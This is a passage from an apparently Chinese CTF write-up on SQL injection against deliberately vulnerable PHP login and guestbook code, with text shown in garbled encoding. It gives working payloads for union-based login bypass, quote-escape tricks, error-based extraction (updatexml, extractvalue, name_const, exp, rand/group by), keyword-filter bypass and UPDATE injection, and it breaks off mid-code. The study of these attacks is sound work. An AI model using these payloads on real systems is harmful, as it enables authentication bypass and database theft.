href="#0x12-æ³¨å‡ºå¯æ§æ•°æ®ç»•è¿‡ç™»å½•" class="headerlink" title="0x12 æ³¨å‡ºå¯æ§æ•°æ®ç»•è¿‡ç™»å½•"></a>0x12 æ³¨å‡ºå¯æ§æ•°æ®ç»•è¿‡ç™»å½•</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">welcome to simplexue</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    $conn = mysql_connect(<span class="string">"********"</span>, <span class="string">"*****"</span>, <span class="string">"********"</span>);</span><br><span class="line">    mysql_select_db(<span class="string">"phpformysql"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Could not select database"</span>);</span><br><span class="line">    <span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . mysql_error($conn));</span><br><span class="line">&#125; </span><br><span class="line">$user = $_POST[user];</span><br><span class="line">$pass = md5($_POST[pass]);</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select pw from php where user='$user'"</span>;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span> (!$query) &#123;</span><br><span class="line">    printf(<span class="string">"Error: %s\n"</span>, mysql_error($conn));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line"><span class="comment">//echo $row["pw"];</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key:************** &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form method=post action=index.php&gt;</span><br><span class="line">&lt;input type=text name=user value=<span class="string">"Username"</span>&gt;</span><br><span class="line">&lt;input type=password name=pass value=<span class="string">"Password"</span>&gt;</span><br><span class="line">&lt;input type=submit&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;a href=<span class="string">"index.txt"</span>&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨userå¤„çš„æ³¨å…¥è¿”å›æƒ³è¦çš„pw</p><p>ä¾‹å¦‚ <code>qweï¼Œ76d80224611fc919a5d54f0ff9fba446</code></p><p>usernameå€¼<code>&#39; union select &#39;76d80224611fc919a5d54f0ff9fba446&#39;#</code></p><p>passwordå€¼<code>qwe</code></p><p>æäº¤è·å¾—flag</p><h2 id="0x13-htmlentitieså®ä½“åŒ–å•å¼•å·æƒ…å†µ"><a href="#0x13-htmlentitieså®ä½“åŒ–å•å¼•å·æƒ…å†µ" class="headerlink" title="0x13 htmlentitieså®ä½“åŒ–å•å¼•å·æƒ…å†µ"></a>0x13 htmlentitieså®ä½“åŒ–å•å¼•å·æƒ…å†µ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#GOAL: get password from admin;</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $str=stripslashes($str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</span><br><span class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line">$query=<span class="string">'SELECT * FROM users WHERE name=\''</span>.$username.<span class="string">'\' AND pass=\''</span>.$password.<span class="string">'\';'</span>;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line"><span class="keyword">if</span>(!$result || mysql_num_rows($result) &lt; <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid password!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$row = mysql_fetch_assoc($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hello "</span>.$row[<span class="string">'name'</span>].<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your password is:"</span>.$row[<span class="string">'pass'</span>].<span class="string">"&lt;/br&gt;"</span>;</span><br></pre></td></tr></table></figure><p>htmlentitieså°†å•å¼•å·å®ä½“åŒ–äº†ï¼Œæ‰€ä»¥å¯ç”¨\æ¥å°†æºå•å¼•å·è½¬ä¹‰</p><p>æ„é€ <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name=&apos;\&apos; AND pass=&apos; or 1=1 limit 2,3#&apos;;</span><br></pre></td></tr></table></figure></p><p>payloadï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=\&amp;password=%20or%201=1%20limit%202,3%23</span><br></pre></td></tr></table></figure></p><h2 id="0x14-æŠ¥é”™æ³¨å…¥-amp-amp-00000select-amp-amp-â€˜-gt-x27"><a href="#0x14-æŠ¥é”™æ³¨å…¥-amp-amp-00000select-amp-amp-â€˜-gt-x27" class="headerlink" title="0x14 æŠ¥é”™æ³¨å…¥ &amp;&amp; /!00000select/ &amp;&amp; â€˜-&gt;\x27"></a>0x14 æŠ¥é”™æ³¨å…¥ &amp;&amp; /<em>!00000select</em>/ &amp;&amp; â€˜-&gt;\x27</h2><p>ç¤ºä¾‹é¢˜ç›®å±äºäºŒæ¬¡æ³¨å…¥ï¼Œåœ¨åˆ é™¤åŠŸèƒ½å¤„è¿›è¡Œæ³¨å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $key)&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($$key <span class="keyword">as</span> $k =&gt; $v)&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_array($v))&#123;</span><br><span class="line">            errorBox(<span class="string">"hello,sangebaimao!"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $k[<span class="number">0</span>] !=<span class="string">'_'</span>?$$k = addslashes($v):$$k = <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $rstr = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(ord($str[$i])&gt;<span class="number">31</span> &amp;&amp; ord($str[$i])&lt;<span class="number">127</span>)&#123;</span><br><span class="line">            $rstr = $rstr.$str[$i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $rstr = str_replace(<span class="string">'\''</span>,<span class="string">''</span>,$rstr);</span><br><span class="line">    <span class="keyword">return</span> $rstr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($message))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/\b(select|insert|update|delete)\b/i"</span>,$message))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"hello,sangebaimao!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(filter($message) !== $message)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"hello,sangebaimao!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $sql=<span class="string">"insert guestbook(`message`) value('$message');"</span>;</span><br><span class="line">    mysql_query($sql);</span><br><span class="line">    $sql = <span class="string">"select * from guestbook order by id limit 0,5;"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    <span class="keyword">if</span>($result)&#123;</span><br><span class="line">        <span class="keyword">while</span>($row = mysql_fetch_array($result))&#123;</span><br><span class="line">            $id = $row[<span class="string">'id'</span>];</span><br><span class="line">            $message = $row[<span class="string">'message'</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"|$id|=&gt;|$message|&lt;br/&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $message = stripcslashes($message);</span><br><span class="line">    $sql = <span class="string">"delete from guestbook where id=$id or message ='$message';"</span>;</span><br><span class="line">    <span class="keyword">if</span>(!mysql_query($sql))&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//print(mysql_error());ä¾æ®è¿™å¥è¯çœ‹å‡ºå¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">print</span>(mysql_error());</span><br><span class="line">        $sql = <span class="string">"delete from guestbook where id=$id"</span>;</span><br><span class="line">        mysql_query($sql);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>sqliå…³é”®:éœ€è¦ç»•è¿‡å•å¼•å·å’Œpreg_match</p><p>å› ä¸ºstripcslasheså‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨<code>1\x27</code>åˆ›é€ å•å¼•å·</p><p><code>/*!00000select*/</code>ç»•è¿‡preg_match</p><blockquote><p>åœ¨mysql,00000è¿™5ä½ä»£è¡¨ç‰ˆæœ¬å·ï¼Œè¡¨ç¤ºåªæœ‰åœ¨å¤§äºè¯¥ç‰ˆæœ¬çš„mysqlä¸­ä¸ä½œä¸ºæ³¨é‡Š</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt;  /*!00000select &apos;zeroyu&apos;*/;</span><br><span class="line">+--------+</span><br><span class="line">| zeroyu |</span><br><span class="line">+--------+</span><br><span class="line">| zeroyu |</span><br><span class="line">+--------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>æ³¨ï¼š <code>concat(0x27,(/*!00000select version()*/))</code>è¿™ä¸ªå¯¹äºUpdateXMLå’ŒExtractValueè€Œè¨€ä¼šæœ€å…ˆæ‰§è¡Œï¼Œä½†æ˜¯å®ƒä¸æ˜¯ä¸€ä¸ªåˆæ ¼xmlè¡¨è¾¾å¼ï¼Œå› è€Œæˆ–é€ æˆæŠ¥é”™ã€‚ä½†è¦æ³¨æ„è¿™ä¸¤ä¸ªæŠ¥é”™çš„æœ€å¤§é•¿åº¦æ˜¯32</p><h3 id="1-åˆ©ç”¨updatexmlæŠ¥é”™"><a href="#1-åˆ©ç”¨updatexmlæŠ¥é”™" class="headerlink" title="1.åˆ©ç”¨updatexmlæŠ¥é”™"></a>1.åˆ©ç”¨updatexmlæŠ¥é”™</h3><blockquote><p>UpdateXML(xml_target, xpath_expr, new_xml)<br>updatexmlå‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œä½œç”¨æ˜¯xmlæ›¿æ¢ï¼ŒæŠŠxml_targetä¸­è¢«xpath_expråŒ¹é…åˆ°çš„éƒ¨åˆ†ä½¿ç”¨new_xmlæ›¿æ¢</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=1\x27 and updatexml(0,concat(0x27,(/*!00000select version()*/)),0)%23</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select updatexml(1,concat(0x7e,(select @@version),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~10.1.36-MariaDB~&apos;</span><br></pre></td></tr></table></figure><h3 id="2-åˆ©ç”¨ExtractValue-æŠ¥é”™"><a href="#2-åˆ©ç”¨ExtractValue-æŠ¥é”™" class="headerlink" title="2.åˆ©ç”¨ExtractValue()æŠ¥é”™"></a>2.åˆ©ç”¨ExtractValue()æŠ¥é”™</h3><blockquote><p>ExtractValue(xml_frag, xpath_expr) å¾—åˆ°xml_fragä¸­è¢«xpath_expråŒ¹é…åˆ°çš„å€¼</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=1\x27 and ExtractValue(0,concat(0x27,(/*!00000select version()*/)))%23;</span><br></pre></td></tr></table></figure><h3 id="3-name-const"><a href="#3-name-const" class="headerlink" title="3.name_const()"></a>3.name_const()</h3><blockquote><p>name_const(name,value)<br>è¿”å›ç»™å®šå€¼ã€‚ å½“ç”¨æ¥äº§ç”Ÿä¸€ä¸ªç»“æœé›†åˆåˆ—æ—¶, name_const()ä¿ƒä½¿è¯¥åˆ—ä½¿ç”¨ç»™å®šåç§°ã€‚</p></blockquote><p>æœ¬é¢˜åˆ©ç”¨çš„æ˜¯è¡¨çš„å­—æ®µå(åˆ—å)ä¸å…è®¸é‡å¤ï¼Œåˆ—åé‡å¤ä¼šæŠ¥é”™ï¼ŒæŠ¥é”™é•¿åº¦æ²¡æœ‰é™åˆ¶</p><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=aaa\x27%20and%20(/*!00000SELECT*/ * FROM(/*!00000SELECT*/(name_const(version(),1)),name_const(version(),1))a)%23</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select name_const(&apos;l&apos;,&apos;f&apos;);</span><br><span class="line">+------+</span><br><span class="line">| l    |</span><br><span class="line">+------+</span><br><span class="line">| f    |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//æ­¤å¤„çš„aæ˜¯åˆ—åˆ«åï¼Œåˆ«åä½¿ç”¨æ—¶æ˜¯å¯ä»¥çœç•¥asçš„</span><br><span class="line">MariaDB [test]&gt; /*!00000SELECT*/(name_const(version(),1)),name_const(1,version())a;</span><br><span class="line">+-----------------+-----------------+</span><br><span class="line">| 10.1.30-MariaDB | a               |</span><br><span class="line">+-----------------+-----------------+</span><br><span class="line">|               1 | 10.1.30-MariaDB |</span><br><span class="line">+-----------------+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="4-exp"><a href="#4-exp" class="headerlink" title="4.exp"></a>4.exp</h3><p>å‰æ: mysql=&lt;5.5.53æ—¶æ‰å¯ä»¥ä½¿ç”¨ï¼Œä¸ç„¶ä¸ä¼šæœ‰è¿”å›ç»“æœçš„</p><p>æ¯”å¦‚æˆ‘åœ¨5.6.xä¸‹è¿›è¡Œæµ‹è¯•å°±æ²¡æœ‰è¿”å›ç»“æœ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select exp(~(select*from(select user())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(~((select #)))&apos;</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸€ä¸ªæŸ¥è¯¢æˆåŠŸè¿”å›ï¼Œåˆ™å…¶è¿”å›å€¼ä¸º0ï¼Œè¿›è¡Œé€»è¾‘éè¿ç®—åå¯å¾—1ï¼Œè¿™ä¸ªå€¼æ˜¯å¯ä»¥è¿›è¡Œæ•°å­¦è¿ç®—çš„ã€‚</p><p>é€šè¿‡å­æŸ¥è¯¢ä¸æŒ‰ä½æ±‚åï¼Œé€ æˆä¸€ä¸ªDOUBLE overflow errorï¼Œå¹¶å€Ÿç”±æ­¤æ³¨å‡ºæ•°æ®ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=aaa\x27 and (/*!00000select exp(~(/*!00000select*/ * from (/*!00000select*/ version())a)))%23</span><br></pre></td></tr></table></figure><p>å‚è€ƒ:<a href="https://www.cnblogs.com/lcamry/articles/5509124.html" target="_blank" rel="noopener">https://www.cnblogs.com/lcamry/articles/5509124.html</a></p><h3 id="5-ä¸»é”®é‡å¤"><a href="#5-ä¸»é”®é‡å¤" class="headerlink" title="5.ä¸»é”®é‡å¤"></a>5.ä¸»é”®é‡å¤</h3><p>concat+rand()+group_by()å¯¼è‡´ä¸»é”®é‡å¤</p><p>ã€‚å®é™…ä¸Šåªè¦æ˜¯countï¼Œrand()ï¼Œgroup byä¸‰ä¸ªè¿ç”¨å°±ä¼šé€ æˆè¿™ç§æŠ¥é”™ï¼Œä¸ä½ç½®æ— å…³ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;10.1.36-MariaDB1&apos; for key &apos;group_key&apos;</span><br></pre></td></tr></table></figure></p><p>floor(rand(0)<em>2)åˆ™ä¼šå›ºå®šå¾—åˆ°011011â€¦çš„åºåˆ—,åœ¨æŸ¥è¯¢æ—¶floor(rand(0)</em>2)ä¼šè¢«è®¡ç®—5æ¬¡ï¼ŒæŸ¥è¯¢åŸå§‹æ•°æ®è¡¨3æ¬¡ï¼Œæ‰€ä»¥è¡¨ä¸­éœ€è¦è‡³å°‘3æ¡æ•°æ®æ‰èƒ½æŠ¥é”™ã€‚</p><h3 id="6-å‡ ä½•å‡½æ•°"><a href="#6-å‡ ä½•å‡½æ•°" class="headerlink" title="6.å‡ ä½•å‡½æ•°"></a>6.å‡ ä½•å‡½æ•°</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geometrycollection()ï¼Œmultipoint()ï¼Œpolygon()ï¼Œmultipolygon()ï¼Œlinestring()ï¼Œmultilinestring()</span><br></pre></td></tr></table></figure><p>è¿™äº›å‡½æ•°å¯¹å‚æ•°è¦æ±‚æ˜¯å½¢å¦‚(1 2,3 3,2 2 1)è¿™æ ·å‡ ä½•æ•°æ®ï¼Œå¦‚æœä¸æ»¡è¶³è¦æ±‚ï¼Œåˆ™ä¼šæŠ¥é”™ã€‚ç»æµ‹è¯•ï¼Œåœ¨ç‰ˆæœ¬å·ä¸º5.5.47ä¸Šå¯ä»¥ç”¨æ¥æ³¨å…¥ï¼Œè€Œåœ¨5.7.17ä¸Šåˆ™ä¸è¡Œã€‚</p><h3 id="7-joinæŠ¥é”™çˆ†å­—æ®µ"><a href="#7-joinæŠ¥é”™çˆ†å­—æ®µ" class="headerlink" title="7.joinæŠ¥é”™çˆ†å­—æ®µ"></a>7.joinæŠ¥é”™çˆ†å­—æ®µ</h3><p>æ³¨ï¼šè¯¥æ–¹æ³•åœ¨çŸ¥é“è¡¨åçš„æƒ…å†µä¸‹ä½¿ç”¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from (select * from è¡¨å a join è¡¨å b) c)  </span><br><span class="line">åœ¨å¾—åˆ°ä¸€ä¸ªå­—æ®µåï¼Œä½¿ç”¨usingå¾—åˆ°ä¸‹ä¸€ä¸ªå­—æ®µ</span><br><span class="line">select * from (select * from è¡¨å a join è¡¨å b using (å·²çŸ¥çš„å­—æ®µ,å·²çŸ¥çš„å­—æ®µ)) c</span><br></pre></td></tr></table></figure><h2 id="0x15-MySQLå¿«é€Ÿç›²æ³¨å°æŠ€å·§"><a href="#0x15-MySQLå¿«é€Ÿç›²æ³¨å°æŠ€å·§" class="headerlink" title="0x15 MySQLå¿«é€Ÿç›²æ³¨å°æŠ€å·§"></a>0x15 MySQLå¿«é€Ÿç›²æ³¨å°æŠ€å·§</h2><p>å°†å­—ç¬¦ä¸²ç»è¿‡hexç¼–ç ä¹‹åï¼Œå†è½¬æˆ10è¿›åˆ¶æ•°å­—ï¼Œé€šè¿‡ç›²æ³¨è·å–å…·ä½“çš„æ•°å­—ï¼Œç„¶åå†å°†å®ƒè¿˜åŸå›å»ã€‚</p><p>æ³¨æ„å½“æ•°å­—è¿‡é•¿æ˜¯å¯ä»¥é‡‡ç”¨æˆªå–å­—ç¬¦ä¸²çš„æ–¹å¼ï¼Œå…«ä½å…«ä½çš„è·å–æ•°æ®ç»“æœï¼Œå…¬å¼:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)), 16, 10);</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a href="http://www.zhutougg.com/2018/02/23/mysqlkuai-su-mang-zhu-xiao-ji-qiao/" target="_blank" rel="noopener">http://www.zhutougg.com/2018/02/23/mysqlkuai-su-mang-zhu-xiao-ji-qiao/</a></p><h2 id="0x16-updateæ³¨å…¥"><a href="#0x16-updateæ³¨å…¥" class="headerlink" title="0x16 updateæ³¨å…¥"></a>0x16 updateæ³¨å…¥</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$link = mysqli_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>);</span><br><span class="line">mysqli_select_db($link, <span class="string">'code'</span>);</span><br><span class="line"></span><br><span class="line">$table = addslashes($_GET[<span class="string">'table'</span>]);</span><br><span class="line">$sql = <span class="string">"UPDATE `&#123;$table&#125;` </span></span><br><span class="line"><span class="string">        SET `username`='admin'</span></span><br><span class="line"><span class="string">        WHERE id=1"</span>;</span><br><span class="line"><span class="keyword">if</span>(!mysqli_query($link, $sql)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(mysqli_error($link));</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($link);</span><br></pre></td></tr></table></figure><p>å…³é”®ç‚¹:</p><ol><li>updateæ³¨å…¥ï¼Œä¸”sqlè¯­å¥æ²¡æœ‰å†™åœ¨ä¸€è¡Œä»£ç é‡Œé¢ =&gt; left join</li><li>addslashesåœ¨å•å¼•å·å’ŒåŒå¼•å·å‰åŠ â€\â€ =&gt; å‡ºç°å•å¼•å·çš„åœ°æ–¹ç”¨charå‡½æ•°ä»£æ›¿</li><li>é—­åˆ`</li><li>é™¤äº†tableè¡¨ä»¥å¤–ä¸çŸ¥é“æ•°æ®åº“çš„å…¶ä»–è¡¨äº†ï¼Œæˆ–è€…æ ¹æœ¬å°±åªæœ‰ä¸€ä¸ªè¡¨ï¼Œæ‰€ä»¥æˆ‘å°±è¦ç”¨mysqlçš„è™šè¡¨dual</li></ol><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?table=test` t left join (select char(97) as user from dual where (extractvalue(1,concat(0x7e,(select version()),0x7e)))) tt on tt.user=`t.username</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a href="https://paper.seebug.org/216/" target="_blank" rel="noopener">https://paper.seebug.org/216/</a></p><h2 id="0x17-00æˆªæ–­"><a href="#0x17-00æˆªæ–­" class="headerlink" title="0x17 %00æˆªæ–­"></a>0x17 %00æˆªæ–­</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$db  = mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'web_brave'</span>,<span class="string">''</span>,<span class="string">'web_brave'</span>);</span><br><span class="line"></span><br><span class="line">$id  = @$_GET[<span class="string">'id'</span>];</span><br><span class="line">$key = $db-&gt;real_escape_string(@$_GET[<span class="string">'key'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\s|[\(\)\'"\/\\=&amp;\|1-9]|#|\/\*|into|file|case|group|order|having|limit|and|or|not|null|union|select|from|where|--/i'</span>, $id))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Attack Detected. Try harder: '</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]); <span class="comment">// attack detected</span></span><br><span class="line"></span><br><span class="line">$query = <span 